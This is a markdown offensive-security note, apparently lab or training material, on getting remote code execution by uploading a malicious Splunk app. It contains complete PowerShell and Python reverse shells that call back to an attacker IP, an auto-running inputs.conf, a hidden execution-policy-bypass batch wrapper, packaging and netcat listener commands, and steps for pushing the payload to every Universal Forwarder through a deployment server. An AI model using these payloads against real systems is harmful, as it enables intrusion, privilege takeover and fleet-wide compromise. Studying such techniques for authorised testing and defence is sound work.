# Attacking Splunk

## Core Technique
Splunk lets admins deploy custom applications. By packaging a **scripted input** that runs a reverse shell script, uploading the app triggers immediate code execution — because Splunk automatically enables and runs new scripted inputs.

> [!tip] Reference
> The Whitel1st/Splunk_Shells-style repo has ready-made Python/PowerShell examples in its `bin/` directory — useful as a template rather than writing this from scratch.

## Step-by-Step: Windows Target (PowerShell)

### 1. Build the App Directory Structure
```bash
tree splunk_shell/

splunk_shell/
├── bin       # scripts to run
└── default   # inputs.conf goes here
```

### 2. Reverse Shell Script (PowerShell one-liner)
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Replace the IP/port with your listener's details before use.

### 3. Configure the Scripted Input (`inputs.conf`)
```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
- `interval` (seconds) is **required** or the input never runs.
- On Windows, Splunk needs a `.bat` wrapper to actually invoke PowerShell.

### 4. Batch Wrapper (`run.bat`)
```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
This runs hidden, bypasses execution policy, and calls the co-located `.ps1` script.

### 5. Package the App
```bash
tar -cvzf updater.tar.gz splunk_shell/
```

### 6. Start a Listener
```bash
sudo nc -lnvp 443
```

### 7. Upload & Trigger
- Navigate to: `Apps → Install app from file`
- Browse to `updater.tar.gz` → Upload

> [!success] Result
> As soon as the app uploads, its status flips to **Enabled**, the scripted input fires, and a reverse shell lands — often as **NT AUTHORITY\SYSTEM**:
> ```
> connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
> PS C:\Windows\system32> whoami
> nt authority\system
> ```

## Linux Target Variant
Same process, but replace the script with a Python reverse shell (Splunk ships with Python on all platforms):
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
Update `rev.py`, rebuild the tarball, upload — same Netcat listener catches the callback.

## Beyond a Single Host: Deployment Servers
If the compromised Splunk instance is a **deployment server**, the same trick can push RCE to any host running a **Universal Forwarder**:
- Drop the malicious app into `$SPLUNK_HOME/etc/deployment-apps` on the compromised deployment server.
- In Windows-heavy environments, use a **PowerShell** reverse shell — Universal Forwarders don't ship with Python like the full Splunk server does.

## Post-Exploitation Notes
With a SYSTEM/root shell on the Splunk host:
- Hunt for credentials in the registry, memory, or filesystem for lateral movement.
- If this is the initial foothold, pivot into broader Active Directory enumeration.

## Quick Recap
| Stage   | Action                                  | Result                               |
| ------- | --------------------------------------- | ------------------------------------ |
| Build   | `bin/` (script) + `default/inputs.conf` | Custom Splunk app skeleton           |
| Package | `tar -cvzf`                             | Deployable `.tar.gz`/`.spl`          |
| Deploy  | Install app from file (web UI)          | Auto-enabled → scripted input runs   |
| Catch   | `nc -lnvp <port>`                       | Reverse shell, often SYSTEM/root     |
| Scale   | Push app to `deployment-apps` dir       | RCE across Universal Forwarder fleet |
